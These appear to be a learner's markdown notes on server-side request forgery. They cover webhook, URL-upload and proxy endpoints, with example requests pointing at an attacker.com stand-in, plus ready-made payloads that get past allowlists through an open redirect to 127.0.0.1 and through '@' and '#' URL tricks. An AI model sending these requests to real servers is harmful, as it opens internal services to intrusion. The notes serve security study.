# explanation 
**Server-Side Request Forgery (SSRF)** is a vulnerability where an attacker tricks a server into making unintended or malicious requests to internal or external resources on behalf of the attacker.

# Webhooks 
are custom HTTP callback endpoints used as a notification system for certain application events. When an event such as new user sign-up or application error occurs, the originating site will make an HTTP request to the webhook URL. These HTTP requests help the company collect information about the website’s performance and visitors. It also helps organizations keep data in sync across multiple web applications.[example of exploiting webhook](https://hackerone.com/reports/2301565)  [another report](https://hackerone.com/reports/508459)   the explanation in the [[scenarios]]

# Potential SSRF Endpoints
- Add a new webhook:
	 `POST /webhook Host: public.example.com
	 `(POST request body) url=https://www.attacker.`

- File upload via URL:
	 `POST /upload_profile_from_url Host: public.example.com
	 `(POST request body) user_id=1234&url=https://www.attacker.com/profile.jpeg

- Proxy service:
	 `https://public.example.com/proxy?url=https://google.com





# Bypassing SSRF Protection
## Bypass Allowlists 

### Allowlists based on the website we are talking  
are generally the hardest to bypass, because they are, by default, stricter than blocklists. But getting around them is still possible if you can find an<span style="color:rgb(146, 208, 80)"> open redirect vulnerability </span>within the allowlisted domains. If you find one, you can request an allowlisted URL that redirects to an internal URL. For example, even if the site allows only profile pictures uploaded from one of its subdomains, you can induce an SSRF through an open redirect.
In the following request, we utilize an open redirect on pics.example.com to redirect the request to 127.0.0.1, the IP address for the localhost. This way, even though the url parameter passes the allowlist, it still redirects to a restricted internal address:
```
POST /upload_profile_from_url Host: public.example.com
(POST request body) user_id=1234&url=https://pics.example.com/123?redirect=127.0.0.1
```
### allow list based on regex  
`POST /upload_profile_from_url Host: public.example.com
(POST request body) user_id=1234&url=<span style="color:rgb(146, 208, 80)">https://pics.example.com@127.0.0.1</span>`
you can use <span style="color:rgb(146, 208, 80)">@</span> to tell the server what's after the @ <span style="color:rgb(146, 208, 80)">is the domain I'm talking </span> 

**or u can use** 

`(POST request body) user_id=1234&url=https://127.0.0.1#/pics.example.com
<span style="color:rgb(112, 48, 160)">the hash here commenting all the content after it </span>



